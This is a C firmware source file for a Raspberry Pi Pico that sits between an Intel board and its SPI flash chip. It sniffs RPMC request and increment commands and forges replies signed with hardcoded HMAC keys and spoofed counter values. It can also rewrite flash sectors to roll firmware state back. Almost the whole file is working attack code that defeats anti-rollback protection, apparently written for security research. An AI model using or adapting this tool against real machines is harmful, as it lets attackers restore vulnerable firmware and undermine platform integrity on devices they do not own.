#include <pico/stdlib.h>
#include <pico/binary_info.h>
#include <pico/multicore.h>
#include <hardware/spi.h>
#include <hardware/clocks.h>
#include <mbedtls/md.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "rpmc.h"
#include "request_sniffer.pio.h"
#include "increment_sniffer.pio.h"
#include "read_interposer.pio.h"
#include "intel_flash_rollback.h"
#include "board_v2.h"

#define HMAC_KEY_SIZE 32


// TODO: The bitmask is unnecessary for the 24 shifts
inline uint32_t reverse(const uint32_t x)
{
    return ((x & UINT32_C(0x000000FF)) << 24) |
           ((x & UINT32_C(0x0000FF00)) <<  8) |
           ((x & UINT32_C(0x00FF0000)) >>  8) |
           ((x & UINT32_C(0xFF000000)) >> 24);
}

// Values for flash state 399093a25b1b61aeb4caf0de42522fba
static uint32_t counter_values[] = {0xCF6, 0xCD4};

// Keys for key_data 01000000
const static uint8_t hmac_keys[4 * HMAC_KEY_SIZE] = {
    // Key Slot 0
    0xf4, 0x27, 0xad, 0xa3, 0x76, 0x79, 0x6f, 0x27,
    0x78, 0x10, 0x78, 0xb2, 0x0a, 0x6c, 0x68, 0x79,
    0x69, 0x3b, 0x90, 0x35, 0x1b, 0x99, 0x5a, 0xe5,
    0x3b, 0x7c, 0x6e, 0x14, 0x54, 0x6c, 0x69, 0xaa,
    // Key Slot 1
    0x1b, 0x3b, 0x9d, 0x0f, 0xd0, 0x78, 0xee, 0x45,
    0xc1, 0x28, 0xe3, 0xdb, 0x8d, 0x4d, 0xac, 0x6d,
    0x67, 0x21, 0x1a, 0xe6, 0xb6, 0x64, 0x43, 0x27,
    0x7e, 0x10, 0xcd, 0x62, 0x1b, 0x42, 0x08, 0x15,
    // Key Slot 2
    0x3d, 0xfd, 0x42, 0x26, 0x75, 0x56, 0x74, 0x73,
    0x2b, 0x72, 0x71, 0xb3, 0x59, 0xb1, 0xe9, 0x5c,
    0xd4, 0x8c, 0x8e, 0xf9, 0x55, 0x4f, 0xf2, 0x5d,
    0x5b, 0x25, 0x19, 0xc5, 0x24, 0x02, 0xe7, 0x68,
    // Key Slot 3
    0x5e, 0x7d, 0x55, 0xcd, 0x06, 0xbb, 0x1e, 0x07,
    0x91, 0xe6, 0x3b, 0xc3, 0x8a, 0x9b, 0xa0, 0xff,
    0x27, 0xd6, 0x3b, 0x75, 0x53, 0xdc, 0xf7, 0x0d,
    0x31, 0x4e, 0x83, 0xb6, 0x03, 0x6d, 0xaf, 0xa9
};


static void u32_into_u8(uint32_t *u32, uint8_t *u8, size_t count)
{
    size_t i;
    uint32_t word;

    for (i = 0; i < (count / 4); ++i) {
        word = u32[i];
        u8[i * 4 + 0] = (word >> 24) & 0xFF;
        u8[i * 4 + 1] = (word >> 16) & 0xFF;
        u8[i * 4 + 2] = (word >>  8) & 0xFF;
        u8[i * 4 + 3] = (word      ) & 0xFF;
    }

    word = u32[i];
    for (size_t j = 0; j < (count % 4); ++j)
        u8[i * 4 + j] = (word >> (24 - 8 * j)) & 0xFF;
}

/* Assumes shift direction is set to left since otherwise put_blocking can be
 * used without as is.
 */
static inline void pio_sm_put_byte_blocking(PIO pio, uint sm, uint8_t data)
{
    pio_sm_put_blocking(pio, sm, data << 24);
}

void interposer_send(PIO pio, uint sm, const uint8_t * data, const uint32_t count)
{
    size_t i;
    uint32_t word;

    // put bit count
    pio_sm_put_blocking(pio, sm, count * 8 - 1);

    // put data in words
    uint32_t words = count & ~0b11;
    for (i = 0; i < words; i += 4) {
        word = 0;
        word |= data[i + 0] << 24;
        word |= data[i + 1] << 16;
        word |= data[i + 2] << 8;
        word |= data[i + 3];
        pio_sm_put_blocking(pio, sm, word);
    }

    if (i >= count)
        return;

    // put last 1-3 bytes
    word = 0;
    for (size_t j = 0; j < (count % 4); ++j)
        word |= data[i + j] << (24 - 8 * j);
    pio_sm_put_blocking(pio, sm, word);
}

/*
 * Intel strategy: Let all OP1s pass, but fake the OP2 responses for request and
 * increment commands. With the request replies we return the spoofed counter
 * values and the increments replies are needed because otherwise the counter
 * value mismatch would get flagged in the status by the chip. Update commands
 * are not of interest to us, because we already know that Intel calls them with
 * KeyData 0x1.
 */
void interpose_intel()
{
    // tell the first SM to match RPMC request commands
    pio_sm_put_blocking(request_sniffer.pio, request_sniffer.sm, 0x9B03);

    // tell the second SM to match OP2
    // TODO: explain the shifts (to gain one more clock cycle of time and
    //       because the PIO discars the LSB due to autopull issues)
    pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, ((0x96 >> 1) << 1));
    // pre-fill the FIFO with a busy wait message
    pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
    pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, WAIT);

    // tell the third SM to match RPMC increment commands
    pio_sm_put_blocking(increment_sniffer.pio, increment_sniffer.sm, 0x9B02);

    unsigned n_req = 1;
    unsigned n_inc = 1;

    // TODO: do this via the pis_smX_rx_fifo_not_empty interrupts
    while (true) {
        if (!pio_sm_is_rx_fifo_empty(request_sniffer.pio, request_sniffer.sm)) {
            union rpmc_request req;
            union rpmc_read_data status = { .status = DONE };

            // get the request command
            for (unsigned i = 0; i < count_of(req.words); ++i)
                req.words[i] = pio_sm_get_blocking(request_sniffer.pio, request_sniffer.sm);

            // at this point we already sent the pre-filled busy message, so we
            // don't need to worry about that here

            // fix byte order of everything
            u32_into_u8(req.words, req.buf, sizeof(req.buf));

            const uint8_t *key = hmac_keys + HMAC_KEY_SIZE * req.idx;

            memcpy(status.tag, req.tag, sizeof(status.tag));
            status.val = reverse(counter_values[req.idx]);
            mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                            key,
                            HMAC_KEY_SIZE,
                            status.tag,
                            sizeof(status.tag) + sizeof(status.val),
                            status.sig);
            static_assert(sizeof(status.sig) == HMAC_KEY_SIZE);

#if 0
            printf("status %d:\n"
                   "\tidx: %02x\n"
                   "\ttag: %02x%02x...%02x%02x\n"
                   "\tval: %04x\n"
                   "\tsig: %02x%02x...%02x%02x\n",
                   n_req++,
                   req.idx,
                   status.tag[0], status.tag[1], status.tag[10], status.tag[11],
                   status.val,
                   status.sig[0], status.sig[1], status.sig[30], status.sig[31]);
#endif

            // send a short ready message
            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, DONE);

            // send the long status
            interposer_send(read_interposer.pio, read_interposer.sm, status.buf, sizeof(status.buf));

            // tell the SM to wait for the next request
            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, 1 << 31);

            // fill the FIFO with a busy wait message again
            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, WAIT);

#if 0
            printf("request %d:\n"
                   "\tidx: %02x\n"
                   "\ttag: %02x%02x...%02x%02x\n",
                   n_req++, req.idx, req.tag[0], req.tag[1], req.tag[10], req.tag[11]);
            //printf("\top1: %02x\n", req.op1);
            //printf("\ttyp: %02x\n", req.typ);
#endif
        } else if (!pio_sm_is_rx_fifo_empty(increment_sniffer.pio, increment_sniffer.sm)) {
            union rpmc_increment inc;

            // get the increment command
            for (unsigned i = 0; i < count_of(inc.words); ++i)
                inc.words[i] = pio_sm_get_blocking(increment_sniffer.pio, increment_sniffer.sm);

            // at this point we already sent the pre-filled busy message, so we
            // don't need to worry about that here

            // fix byte order of everything
            u32_into_u8(&inc.words[0], &inc.buf[0], 4);

#if 1
            printf("++c%d (=%x)\n", inc.idx, inc.old + 1);
#endif
            if (inc.idx > 1)
                continue;

            if (counter_values[inc.idx] != inc.old) {
                printf("c%d mismatch: %08x != %08x\n", inc.idx,
                       counter_values[inc.idx], inc.old);
                counter_values[inc.idx] = inc.old;
            }

            counter_values[inc.idx]++;

            // send a short ready message
            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, DONE);

            // send a short ready message
            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, DONE);

            // tell the SM to wait for the next request
            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, 1 << 31);

            // fill the FIFO with a busy wait message again
            pio_sm_put_blocking(read_interposer.pio, read_interposer.sm, (8 - 1));
            pio_sm_put_byte_blocking(read_interposer.pio, read_interposer.sm, WAIT);
        }
    }
}

#define FLASH_PAGE_SIZE         256
#define FLASH_SECTOR_SIZE       4096

static inline void cs_select(uint cs_pin) {
	asm volatile("nop \n nop \n nop"); // FIXME
	gpio_put(cs_pin, 0);
	asm volatile("nop \n nop \n nop"); // FIXME
}

static inline void cs_deselect(uint cs_pin) {
	asm volatile("nop \n nop \n nop"); // FIXME
	gpio_put(cs_pin, 1);
	asm volatile("nop \n nop \n nop"); // FIXME
}

uint8_t get_flash_status(spi_inst_t *spi, uint cs_pin)
{
    cs_select(cs_pin);
    uint8_t cmd[] = {
        0x05, // Read Status Register
        0
    };
    uint8_t out[sizeof(cmd)];
    spi_write_read_blocking(spi, cmd, out, sizeof(cmd));
    cs_deselect(cs_pin);

    return out[1];
}

void flash_erase(spi_inst_t *spi, uint cs_pin, uint32_t addr) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
        0x21, // 4-byte addres sector erase
        addr >> 24,
        addr >> 16,
        addr >> 8,
        addr
    };

    spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
    //spi_read_blocking(spi, 0, buf, len);
    cs_deselect(cs_pin);
}

void flash_write(spi_inst_t *spi, uint cs_pin, uint32_t addr, const uint8_t * buf, const size_t len) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
		0x12, // 4-byte page program
        addr >> 24,
		addr >> 16,
		addr >> 8,
		addr
	};

	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
	spi_write_blocking(spi, buf, len);
	cs_deselect(cs_pin);
}

void flash_write_enable(spi_inst_t *spi, uint cs_pin) {
	cs_select(cs_pin);
	const uint8_t cmdbuf[] = {
		0x06, // flash write enable
	};

	spi_write_blocking(spi, cmdbuf, sizeof(cmdbuf));
	cs_deselect(cs_pin);
}

void flash_wait_done(spi_inst_t *spi, uint cs_pin) {
    while (get_flash_status(spi, cs_pin) != 0)
        sleep_ms(1);
}

void write_segment(spi_inst_t * const out_spi, const unsigned int cs, const uint32_t base_addres, const size_t len , const uint8_t data[len])
{
    for (uint32_t offset = 0; offset < len; offset += FLASH_PAGE_SIZE) {
        const uint32_t target_addr = base_addres + offset;

        // Erase
        if (target_addr % FLASH_SECTOR_SIZE == 0){
            flash_write_enable(out_spi, cs);
            sleep_us(100);
            flash_erase(out_spi, cs, target_addr);
            sleep_us(100);
            flash_wait_done(out_spi, cs);
        }

        // Write
        flash_write_enable(out_spi, cs);
        sleep_us(100);
        flash_write(out_spi, cs, target_addr, data + offset, MIN(len - offset, FLASH_PAGE_SIZE));
        sleep_us(100);
        flash_wait_done(out_spi, cs);
    }
}

void reprogram_flash(spi_inst_t * const out_spi, const unsigned int cs)
{
    for (unsigned i = 0; i < count_of(sector); ++i)
        write_segment(out_spi, cs, sector_addr[i], sector_len[i], sector[i]);
}

void init_mux()
{
#ifdef PIN_N_MUX_EN
    // Enable the mux (active low)
    gpio_init(PIN_N_MUX_EN);
    gpio_put(PIN_N_MUX_EN, 0);
    //gpio_set_drive_strength(PIN_N_MUX_EN, GPIO_DRIVE_STRENGTH_8MA);
    gpio_set_dir(PIN_N_MUX_EN, GPIO_OUT);
#endif

    gpio_init(PIN_MUX_INTERPOSE);
    gpio_set_slew_rate(PIN_MUX_INTERPOSE, GPIO_SLEW_RATE_FAST);
    // TODO: do we still need this?
    gpio_set_drive_strength(PIN_MUX_INTERPOSE, GPIO_DRIVE_STRENGTH_2MA);
    gpio_set_dir(PIN_MUX_INTERPOSE, GPIO_OUT);

    // The mux behaved sometimes inconsistent in our testing, especially when
    // used for the first time after turning on. To make it more reliable, prime
    // the mux by switching it to target <-> pico and driving the muxed MISO pin
    // a couple of times.
    //
    // TODO: do we still need this?
    gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
    sleep_us(100);
    for (unsigned i = 0; i < 10; ++i) {
        gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
        sleep_us(1);
        gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
    }
    sleep_us(100);
    gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_CHIP);
    sleep_us(1);

    // Select target <-> pico
    gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
    // Set muxed MISO to 0xFF by default
    gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
}

void init_flashing_pins()
{
    // TODO: how high can we go?
    spi_init(PICO_CHIP_SPI_INST, 2 * 1000 * 1000);

    // We can't use the SPI function for CS because then every byte will be send
    // in a separate CS transaction
    gpio_init(PIN_PICO_CHIP_SPI_CS);
    gpio_put(PIN_PICO_CHIP_SPI_CS, 1);
    gpio_set_dir(PIN_PICO_CHIP_SPI_CS, GPIO_OUT);

    gpio_set_function(PIN_PICO_CHIP_SPI_CLK, GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_CHIP_SPI_RX , GPIO_FUNC_SPI);
    gpio_set_function(PIN_PICO_CHIP_SPI_TX , GPIO_FUNC_SPI);

    sleep_us(100);
}

// Set a gpio to floating / high impedance
void gpio_set_highz(uint gpio)
{
    gpio_set_function(gpio, GPIO_FUNC_NULL);
    gpio_disable_pulls(gpio);
    gpio_set_input_enabled(gpio, false);
}

int main()
{
    // Overclock
    set_sys_clock_khz(250000, true);

    // Initialize stdio
    stdio_init_all();
    sleep_ms(1000);

    // Configure voltage switcher (TPS2116DRL)
    gpio_init_mask64((1 << PIN_CHIP_VOLT_MODE) | (1 << PIN_CHIP_VOLT_SEL));
    gpio_put(PIN_CHIP_VOLT_MODE, 1); // enable switching voltage
    gpio_put(PIN_CHIP_VOLT_SEL, 1); // use target voltage
    gpio_set_dir_out_masked64((1 << PIN_CHIP_VOLT_MODE) | (1 << PIN_CHIP_VOLT_SEL));

    // Configure SPI capture pins
    gpio_init_mask64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
                      | (1 << PIN_PICO_BOARD_SPI_CLK)
                      | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
                      | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
                      | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
                      | (1 << PIN_PICO_BOARD_SPI_CS));
    gpio_set_dir_in_masked64((1 << PIN_PICO_BOARD_SPI_MOSI_DQ0)
                      | (1 << PIN_PICO_BOARD_SPI_CLK)
                      | (1 << PIN_PICO_BOARD_SPI_HOLD_DQ3)
                      | (1 << PIN_PICO_BOARD_SPI_WP_DQ2)
                      | (1 << PIN_PICO_BOARD_SPI_MISO_DQ1)
                      | (1 << PIN_PICO_BOARD_SPI_CS));
    // TODO: do we still need this?
    gpio_disable_pulls(PIN_PICO_BOARD_SPI_MISO_DQ1);

    // Configure the chip flashing pins. While we're not using them they need to
    // be configured as floating to not disturb the target <-> chip
    // communication
    gpio_set_highz(PIN_PICO_CHIP_SPI_RX);
    gpio_set_highz(PIN_PICO_CHIP_SPI_CS);
    gpio_set_highz(PIN_PICO_CHIP_SPI_CLK);
    gpio_set_highz(PIN_PICO_CHIP_SPI_TX);

    // Configure the muxed MISO output pin
    gpio_init(PIN_PICO_OUT_SPI_MISO_DQ1);
    gpio_set_dir(PIN_PICO_OUT_SPI_MISO_DQ1, GPIO_OUT);
    gpio_set_slew_rate(PIN_PICO_OUT_SPI_MISO_DQ1, GPIO_SLEW_RATE_FAST);
    gpio_set_drive_strength(PIN_PICO_OUT_SPI_MISO_DQ1, GPIO_DRIVE_STRENGTH_12MA);

    // Configure and prime the mux
    init_mux();

switch_case:
    printf("Enter option [ir]\n");
    switch (getchar()) {
        case 'i':
            // Let the target speak with the chip
            gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_CHIP);

            // Init all PIO state machines
            request_sniffer_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0);
            read_interposer_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0, PIN_PICO_OUT_SPI_MISO_DQ1, PIN_MUX_INTERPOSE);
            increment_sniffer_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0);

            printf("c0 = %08x\n", counter_values[0]);
            printf("c1 = %08x\n", counter_values[1]);

            printf("Interposing Intel\n");
            interpose_intel();
            break;

        case 'r':
            // Disconnect the chip from the board
            gpio_put(PIN_MUX_INTERPOSE, MUX_TARGET_PICO);
            sleep_ms(1);

            init_flashing_pins();

            printf("Reprogramming flash sectors...\n");
            reprogram_flash(PICO_CHIP_SPI_INST, PIN_PICO_CHIP_SPI_CS);
            printf("done\n");

            // Make the flashing pins floating again
            gpio_set_highz(PIN_PICO_CHIP_SPI_RX);
            gpio_set_highz(PIN_PICO_CHIP_SPI_CS);
            gpio_set_highz(PIN_PICO_CHIP_SPI_CLK);
            gpio_set_highz(PIN_PICO_CHIP_SPI_TX);
            break;

        case 't':
            printf("Test\n");
            //gpio_put(PIN_N_MUX_EN, 0);
            gpio_put(PIN_MUX_INTERPOSE, 0);

            while (getchar()) {
                printf("Toggle\n");
                gpio_xor_mask((1 << PIN_MUX_INTERPOSE) | (1 << PIN_CHIP_VOLT_SEL));
            }
            break;

        default: // do nothing just leave chip directly connected
            //gpio_put(PIN_N_MUX_EN, 0);
            gpio_put(PIN_MUX_INTERPOSE, 0);
            printf("Just passing traffic through\n");
            break;
    }

    while (true)
        tight_loop_contents();

    return 0;
}